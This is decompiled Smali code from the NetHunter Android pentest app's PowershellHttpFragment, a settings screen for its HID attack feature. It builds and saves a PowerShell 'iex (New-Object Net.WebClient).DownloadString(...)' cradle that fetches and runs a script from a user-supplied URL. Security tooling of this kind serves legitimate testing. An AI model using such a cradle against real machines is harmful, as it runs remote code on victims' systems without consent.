.class public Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;
.super Lcom/offsec/nethunter/HidFragment;
.source "HidFragment.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/offsec/nethunter/HidFragment;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x9
    name = "PowershellHttpFragment"
.end annotation


# instance fields
.field private configFilePath:Ljava/lang/String;

.field private configFileUrlPath:Ljava/lang/String;

.field private context:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 572
    invoke-direct {p0}, Lcom/offsec/nethunter/HidFragment;-><init>()V

    return-void
.end method

.method static synthetic lambda$loadOptions$0(Ljava/util/regex/Matcher;Landroid/widget/EditText;)V
    .locals 1
    .param p0, "matcherPayloadUrl"    # Ljava/util/regex/Matcher;
    .param p1, "payloadUrl"    # Landroid/widget/EditText;

    .line 628
    invoke-virtual {p0}, Ljava/util/regex/Matcher;->find()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 629
    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v0

    .line 630
    .local v0, "payloadUrlValue":Ljava/lang/String;
    invoke-virtual {p1, v0}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    .line 632
    .end local v0    # "payloadUrlValue":Ljava/lang/String;
    :cond_0
    return-void
.end method

.method private loadOptions(Landroid/view/View;)V
    .locals 4
    .param p1, "rootView"    # Landroid/view/View;

    .line 614
    const v0, 0x7f0a03b4

    invoke-virtual {p1, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    .line 615
    .local v0, "payloadUrl":Landroid/widget/EditText;
    new-instance v1, Lcom/offsec/nethunter/utils/ShellExecuter;

    invoke-direct {v1}, Lcom/offsec/nethunter/utils/ShellExecuter;-><init>()V

    .line 617
    .local v1, "exe":Lcom/offsec/nethunter/utils/ShellExecuter;
    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment$$ExternalSyntheticLambda0;

    invoke-direct {v3, p0, v1, v0}, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment$$ExternalSyntheticLambda0;-><init>(Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;Lcom/offsec/nethunter/utils/ShellExecuter;Landroid/widget/EditText;)V

    invoke-direct {v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 633
    invoke-virtual {v2}, Ljava/lang/Thread;->start()V

    .line 634
    return-void
.end method


# virtual methods
.method synthetic lambda$loadOptions$1$com-offsec-nethunter-HidFragment$PowershellHttpFragment(Lcom/offsec/nethunter/utils/ShellExecuter;Landroid/widget/EditText;)V
    .locals 8
    .param p1, "exe"    # Lcom/offsec/nethunter/utils/ShellExecuter;
    .param p2, "payloadUrl"    # Landroid/widget/EditText;

    .line 618
    iget-object v0, p0, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->configFileUrlPath:Ljava/lang/String;

    invoke-virtual {p1, v0}, Lcom/offsec/nethunter/utils/ShellExecuter;->ReadFile_SYNC(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 619
    .local v0, "textUrl":Ljava/lang/String;
    iget-object v1, p0, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->configFilePath:Ljava/lang/String;

    invoke-virtual {p1, v1}, Lcom/offsec/nethunter/utils/ShellExecuter;->ReadFile_SYNC(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 620
    .local v1, "text":Ljava/lang/String;
    const-string v2, "DownloadString\\(\"(.*)\"\\)"

    .line 621
    .local v2, "regExPatPayloadUrl":Ljava/lang/String;
    const/16 v3, 0x8

    invoke-static {v2, v3}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v3

    .line 622
    .local v3, "patternPayloadUrl":Ljava/util/regex/Pattern;
    invoke-virtual {v3, v0}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v4

    .line 624
    .local v4, "matcherPayloadUrl":Ljava/util/regex/Matcher;
    const-string v5, "\n"

    invoke-virtual {v1, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    .line 625
    .local v5, "lines":[Ljava/lang/String;
    array-length v6, v5

    add-int/lit8 v6, v6, -0x1

    aget-object v6, v5, v6

    .line 627
    .local v6, "line":Ljava/lang/String;
    new-instance v7, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment$$ExternalSyntheticLambda1;

    invoke-direct {v7, v4, p2}, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment$$ExternalSyntheticLambda1;-><init>(Ljava/util/regex/Matcher;Landroid/widget/EditText;)V

    invoke-virtual {p2, v7}, Landroid/widget/EditText;->post(Ljava/lang/Runnable;)Z

    .line 633
    return-void
.end method

.method public onClick(Landroid/view/View;)V
    .locals 6
    .param p1, "v"    # Landroid/view/View;

    .line 596
    invoke-virtual {p1}, Landroid/view/View;->getId()I

    move-result v0

    const v1, 0x7f0a03ca

    if-ne v0, v1, :cond_2

    .line 597
    invoke-virtual {p0}, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->getView()Landroid/view/View;

    move-result-object v0

    if-nez v0, :cond_0

    .line 598
    return-void

    .line 600
    :cond_0
    new-instance v0, Lcom/offsec/nethunter/utils/ShellExecuter;

    invoke-direct {v0}, Lcom/offsec/nethunter/utils/ShellExecuter;-><init>()V

    .line 601
    .local v0, "exe":Lcom/offsec/nethunter/utils/ShellExecuter;
    invoke-virtual {p0}, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->getView()Landroid/view/View;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/View;->getRootView()Landroid/view/View;

    move-result-object v1

    const v2, 0x7f0a03b4

    invoke-virtual {v1, v2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/EditText;

    .line 602
    .local v1, "newPayloadUrl":Landroid/widget/EditText;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "iex (New-Object Net.WebClient).DownloadString(\""

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\"); "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 604
    .local v2, "newText":Ljava/lang/String;
    iget-object v3, p0, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->configFileUrlPath:Ljava/lang/String;

    invoke-virtual {v0, v2, v3}, Lcom/offsec/nethunter/utils/ShellExecuter;->SaveFileContents(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v3

    .line 605
    .local v3, "isSaved":Z
    if-nez v3, :cond_1

    .line 606
    iget-object v4, p0, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->context:Landroid/content/Context;

    const-string v5, "Source not updated (configFileUrlPath)"

    invoke-static {v4, v5}, Lcom/offsec/nethunter/utils/NhPaths;->showMessage(Landroid/content/Context;Ljava/lang/String;)V

    .line 608
    .end local v0    # "exe":Lcom/offsec/nethunter/utils/ShellExecuter;
    .end local v1    # "newPayloadUrl":Landroid/widget/EditText;
    .end local v2    # "newText":Ljava/lang/String;
    .end local v3    # "isSaved":Z
    :cond_1
    goto :goto_0

    .line 609
    :cond_2
    iget-object v0, p0, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->context:Landroid/content/Context;

    const-string v1, "Unknown click"

    invoke-static {v0, v1}, Lcom/offsec/nethunter/utils/NhPaths;->showMessage(Landroid/content/Context;Ljava/lang/String;)V

    .line 611
    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 2
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 579
    invoke-super {p0, p1}, Lcom/offsec/nethunter/HidFragment;->onCreate(Landroid/os/Bundle;)V

    .line 580
    invoke-virtual {p0}, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->getContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->context:Landroid/content/Context;

    .line 581
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Lcom/offsec/nethunter/utils/NhPaths;->CHROOT_PATH()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/var/www/html/powershell-payload"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->configFilePath:Ljava/lang/String;

    .line 582
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Lcom/offsec/nethunter/utils/NhPaths;->CHROOT_PATH()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/var/www/html/powershell-url"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->configFileUrlPath:Ljava/lang/String;

    .line 583
    return-void
.end method

.method public onCreateView(Landroid/view/LayoutInflater;Landroid/view/ViewGroup;Landroid/os/Bundle;)Landroid/view/View;
    .locals 2
    .param p1, "inflater"    # Landroid/view/LayoutInflater;
    .param p2, "container"    # Landroid/view/ViewGroup;
    .param p3, "savedInstanceState"    # Landroid/os/Bundle;

    .line 588
    const v0, 0x7f0d0057

    const/4 v1, 0x0

    invoke-virtual {p1, v0, p2, v1}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;Z)Landroid/view/View;

    move-result-object v0

    .line 589
    .local v0, "rootView":Landroid/view/View;
    const v1, 0x7f0a03ca

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/Button;

    .line 590
    .local v1, "b":Landroid/widget/Button;
    invoke-virtual {v1, p0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 591
    invoke-direct {p0, v0}, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->loadOptions(Landroid/view/View;)V

    .line 592
    return-object v0
.end method
